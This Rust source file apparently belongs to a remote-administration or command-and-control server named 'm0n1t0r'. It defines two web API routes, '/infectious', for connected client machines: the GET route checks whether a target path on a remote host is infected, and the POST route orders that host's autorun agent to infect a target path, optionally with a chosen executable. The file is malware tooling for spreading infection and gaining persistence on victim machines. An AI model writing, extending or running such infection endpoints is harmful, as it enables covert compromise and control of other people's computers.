use crate::{
    ServerMap,
    web::{Response, Result as WebResult, api::client::autorun},
};
use actix_web::{
    Responder, get, post,
    web::{Data, Form, Json, Path, Query},
};
use m0n1t0r_common::autorun::Agent as _;
use serde::Deserialize;
use std::{net::SocketAddr, path::PathBuf, sync::Arc};
use tokio::sync::RwLock;

#[derive(Deserialize)]
struct Infectious {
    target: PathBuf,
    exe: Option<PathBuf>,
}

#[get("/infectious")]
pub async fn get(
    data: Data<Arc<RwLock<ServerMap>>>,
    addr: Path<SocketAddr>,
    Query(query): Query<Infectious>,
) -> WebResult<impl Responder> {
    let (autorun_agent, _) = autorun::agent(data.clone(), &addr).await?;

    Ok(Json(Response::success(match query.exe {
        Some(exe) => autorun_agent.infectious_at(query.target, exe).await?,
        None => autorun_agent.infectious(query.target).await?,
    })?))
}

#[post("/infectious")]
pub async fn post(
    data: Data<Arc<RwLock<ServerMap>>>,
    addr: Path<SocketAddr>,
    Form(form): Form<Infectious>,
) -> WebResult<impl Responder> {
    let (agent, _) = autorun::agent(data, &addr).await?;

    Ok(Json(Response::success(match form.exe {
        Some(exe) => agent.infect_at(form.target, exe).await?,
        None => agent.infect(form.target).await?,
    })?))
}
